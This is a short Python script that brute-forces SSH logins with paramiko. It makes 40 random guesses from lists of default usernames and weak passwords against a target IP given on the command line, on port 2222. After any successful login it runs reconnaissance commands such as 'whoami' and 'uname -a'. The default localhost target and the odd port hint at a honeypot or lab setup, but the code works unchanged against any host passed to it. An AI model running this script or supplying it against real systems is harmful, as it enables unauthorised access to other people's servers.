import paramiko
import time
import random
import sys
import socket
from paramiko.ssh_exception import SSHException

# =========================
# TARGET CONFIGURATION
# =========================
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 2222

# =========================
# ATTACK DATA
# =========================
usernames = ["root", "admin", "user", "test", "ubuntu", "guest"]
passwords = ["12345", "password", "admin", "root", "toor", "qwerty", "letmein"]
commands = ["ls", "pwd", "whoami", "uname -a"]

# =========================
# ATTACK FUNCTION
# =========================
def attempt_login(username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[ATTEMPT] {username}:{password}")

        client.connect(
            TARGET_IP,
            port=PORT,
            username=username,
            password=password,
            timeout=8,              # increased timeout
            banner_timeout=8,
            auth_timeout=8
        )

        print(f"[SUCCESS] {username}:{password}")

        for cmd in random.sample(commands, 3):
            client.exec_command(cmd)
            print(f"[COMMAND] {cmd}")
            time.sleep(1)

        client.close()

    except (SSHException, socket.timeout):
        print(f"[TIMEOUT] {username}:{password}")

    except Exception:
        print(f"[FAILED] {username}:{password}")

# =========================
# MAIN LOOP
# =========================
def main():
    print(f"[INFO] Target: {TARGET_IP}:{PORT}\n")

    attempts = 40

    for i in range(attempts):
        username = random.choice(usernames)
        password = random.choice(passwords)

        attempt_login(username, password)

        delay = random.uniform(2, 4)   # slightly slower = more stable
        print(f"[WAIT] {round(delay, 2)} seconds\n")
        time.sleep(delay)

if __name__ == "__main__":
    main()
